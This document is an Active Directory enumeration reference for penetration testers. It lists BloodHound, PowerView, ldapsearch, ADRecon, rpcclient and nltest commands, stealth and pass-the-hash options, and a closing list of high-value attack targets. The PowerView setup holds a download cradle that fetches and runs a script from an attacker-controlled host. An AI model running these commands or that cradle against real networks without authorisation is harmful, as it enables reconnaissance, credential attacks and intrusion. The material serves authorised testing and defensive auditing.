# Active Directory Enumeration Reference

## Pre-Check: Is the Host Domain Joined?

### Windows
```cmd
echo %USERDOMAIN%                       :: Domain name (WORKGROUP = not joined)
echo %LOGONSERVER%                      :: Authenticating DC
systeminfo | findstr /B /C:"Domain"     :: Domain info from systeminfo
nltest /dsgetdc:%USERDOMAIN%            :: Query DC for domain
```

### Linux (Domain-Joined via SSSD/Winbind)
```bash
realm list 2>/dev/null                  # Show joined domain
cat /etc/krb5.conf 2>/dev/null         # Kerberos config
cat /etc/sssd/sssd.conf 2>/dev/null    # SSSD config
klist 2>/dev/null                       # Current Kerberos tickets
```

---

## BloodHound Data Collection

### bloodhound-python (From Linux)
```bash
# Basic collection — all methods
bloodhound-python -u '<user>' -p '<pass>' -d <domain.local> -dc <dc.domain.local> -c all

# With ZIP output
bloodhound-python -u '<user>' -p '<pass>' -d <domain.local> -dc <dc.domain.local> -c all --zip

# Specify DNS server (useful when resolv.conf doesn't point to DC)
bloodhound-python -u '<user>' -p '<pass>' -d <domain.local> -dc <dc.domain.local> -c all -ns <dns_ip>

# Pass-the-hash authentication
bloodhound-python -u '<user>' -hashes :<nthash> -d <domain.local> -dc <dc.domain.local> -c all

# Kerberos authentication
bloodhound-python -u '<user>' -p '<pass>' -d <domain.local> -dc <dc.domain.local> -c all -k

# Specific collectors only
bloodhound-python -u '<user>' -p '<pass>' -d <domain.local> -dc <dc.domain.local> -c Group,LocalAdmin,Session,Trusts

# DCOnly (LDAP only, no SMB — stealthier)
bloodhound-python -u '<user>' -p '<pass>' -d <domain.local> -dc <dc.domain.local> -c DCOnly
```

**Collector methods:** Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All

### SharpHound (From Windows)
```powershell
# Collect everything
.\SharpHound.exe -c All --zipfilename bloodhound.zip

# With domain specification
.\SharpHound.exe -c All --domain <domain.local>

# Stealth mode (no SMB enum, LDAP only)
.\SharpHound.exe -c DCOnly --stealth

# PowerShell ingestor
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp -ZipFileName bh.zip
Invoke-BloodHound -CollectionMethod DCOnly -Stealth
```

---

## PowerView Enumeration (PowerShell)

### Setup
```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Or load from memory
IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')
```

### Domain Info
```powershell
Get-Domain                              # Current domain details
Get-DomainSID                           # Domain SID
Get-DomainPolicy                        # Domain password/Kerberos policy
Get-DomainController                    # All domain controllers
Get-DomainController | Select-Object Name, IPAddress, OSVersion
Get-ForestDomain                        # All domains in the forest
Get-DomainFunctionalLevel              # Domain functional level
```

### User Enumeration
```powershell
Get-DomainUser | Select-Object samaccountname, description, memberof, lastlogon
Get-DomainUser -SPN                     # Kerberoastable users
Get-DomainUser -AdminCount              # Protected admin users (AdminCount=1)
Get-DomainUser -AllowDelegation         # Users allowing delegation
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE  # Enabled users only
Get-DomainUser -LDAPFilter '(description=*pass*)' -Properties samaccountname,description  # Passwords in description
Get-DomainUser -Properties samaccountname, logoncount | Where-Object {$_.logoncount -eq 0}  # Never-logged-in users
```

### Group Enumeration
```powershell
Get-DomainGroup | Select-Object cn, description
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse
Get-DomainGroupMember -Identity "Schema Admins"
Get-DomainGroupMember -Identity "Account Operators"
Get-DomainGroupMember -Identity "Backup Operators"
Get-DomainGroupMember -Identity "Server Operators"
Get-DomainGroup -UserName <targetuser>  # Groups for a specific user
```

### Computer Enumeration
```powershell
Get-DomainComputer -Properties DnsHostName, OperatingSystem, OperatingSystemVersion | Sort-Object OperatingSystem
Get-DomainComputer -Unconstrained        # Computers with unconstrained delegation
Get-DomainComputer -TrustedToAuth        # Constrained delegation
Get-DomainComputer -OperatingSystem "*Server*"  # Servers only
Get-DomainComputer -Ping                 # Only alive hosts
```

### Trust Enumeration
```powershell
Get-DomainTrust                          # All domain trusts
Get-DomainTrust -Domain <target_domain>  # Cross-domain trust
Get-ForestTrust                          # Forest trusts
```

### GPO Enumeration
```powershell
Get-DomainGPO | Select-Object DisplayName, Name, GpcFileSysPath
Get-DomainGPO -ComputerIdentity <target_computer>  # GPOs applied to a computer
Get-DomainGPO -UserIdentity <target_user>           # GPOs applied to a user
Get-DomainGPOLocalGroup                  # GPO-restricted groups
```

### ACL Enumeration
```powershell
Get-ObjectAcl -SamAccountName <user> -ResolveGUIDs
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -notmatch "Admins|SYSTEM|CREATOR"}
```

### Share Enumeration
```powershell
Find-DomainShare -CheckShareAccess       # Accessible shares across domain
Find-InterestingDomainShareFile          # Interesting files in accessible shares
```

---

## ldapsearch Queries (From Linux)

### Basic Queries
```bash
# All users
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(objectClass=user)" sAMAccountName userAccountControl description memberOf

# Domain Admins
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(memberOf=CN=Domain Admins,CN=Users,dc=domain,dc=local)" sAMAccountName

# Kerberoastable accounts (have SPN set)
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# AS-REP roastable accounts (no preauth)
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

# Computers
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(objectClass=computer)" dNSHostName operatingSystem

# Groups
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(objectClass=group)" cn member description

# Trust objects
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(objectClass=trustedDomain)" cn trustPartner trustDirection trustType

# GPOs
ldapsearch -x -H ldap://<dc> -D "user@domain.local" -w '<pass>' -b "dc=domain,dc=local" \
    "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath
```

### Anonymous Bind (if allowed)
```bash
ldapsearch -x -H ldap://<dc> -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName
ldapsearch -x -H ldap://<dc> -b "" -s base namingContexts  # Get naming contexts
```

---

## Windows Trust Enumeration

```cmd
nltest /domain_trusts                   :: All domain trusts
nltest /domain_trusts /all_trusts       :: All trusts including forest
nltest /dclist:<domain>                 :: List DCs for domain
nltest /dsgetdc:<domain>                :: Locate DC
nltest /trusted_domains                 :: Trusted domains
```

```powershell
Get-ADTrust -Filter *                   # All AD trusts
Get-ADForest | Select-Object Domains, ForestMode, RootDomain
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

---

## ADRecon (Comprehensive AD Report)

```powershell
# Default collection (all modules)
.\ADRecon.ps1

# Specify DC and credentials
.\ADRecon.ps1 -DomainController <dc.domain.local> -Credential <domain\user>

# Collect specific modules
.\ADRecon.ps1 -Collect Users,Groups,Computers,Trusts,GPOs,ACLs

# Generate Excel report from collected data
.\ADRecon.ps1 -GenExcel C:\temp\ADRecon-Report.xlsx
```

**Modules:** Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, Groups, GroupMembers, GroupChanges, OUs, GPOs, gPLinks, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, DACLs, SACLs

---

## rpcclient Enumeration

```bash
# Null session
rpcclient -U '' -N <target>

# Authenticated
rpcclient -U '<domain>/<user>%<pass>' <target>

# Useful commands (run inside rpcclient or with -c)
rpcclient -U '<user>%<pass>' <target> -c 'enumdomusers'          # List users
rpcclient -U '<user>%<pass>' <target> -c 'enumdomgroups'         # List groups
rpcclient -U '<user>%<pass>' <target> -c 'queryuser 0x1f4'       # Query RID 500 (Admin)
rpcclient -U '<user>%<pass>' <target> -c 'querygroupmem 0x200'   # Domain Admins members
rpcclient -U '<user>%<pass>' <target> -c 'getdompwinfo'          # Password policy
rpcclient -U '<user>%<pass>' <target> -c 'lsaenumsid'            # Enumerate SIDs
rpcclient -U '<user>%<pass>' <target> -c 'lookupnames administrator'  # Resolve name to SID
rpcclient -U '<user>%<pass>' <target> -c 'lookupsids S-1-5-21-...'   # Resolve SID to name
rpcclient -U '<user>%<pass>' <target> -c 'enumprivs'             # Enumerate privileges
rpcclient -U '<user>%<pass>' <target> -c 'netshareenum'          # List shares via RPC
```

---

## Key Targets in AD Enumeration

1. **Domain Admins / Enterprise Admins** — highest value accounts
2. **Kerberoastable accounts** (SPN set) — crack offline for passwords
3. **AS-REP roastable** (no preauth) — request and crack TGTs
4. **Unconstrained delegation** — compromise gets all TGTs
5. **Constrained delegation** — impersonate users to specific services
6. **AdminCount=1 users** — protected users, likely privileged
7. **Trust relationships** — paths to other domains/forests
8. **GPO-controlled groups** — GPO modifications can grant access
9. **ACL misconfigurations** — GenericAll, WriteDacl, WriteOwner on high-value objects
10. **LAPS** — local admin passwords stored in AD
